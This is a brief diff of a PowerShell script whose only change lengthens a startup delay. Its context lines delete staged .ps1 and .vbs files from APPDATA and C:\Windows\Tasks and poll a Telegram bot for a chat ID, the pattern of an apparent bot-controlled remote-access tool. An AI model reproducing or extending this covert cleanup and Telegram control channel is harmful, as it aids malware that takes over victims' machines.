@@ -39,7 +39,7 @@ $pause = [char]::ConvertFromUtf32(0x23F8)
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
 # Startup Delay
-Sleep 7
+Sleep 9
 if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}
 # Get Chat ID from the bot
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
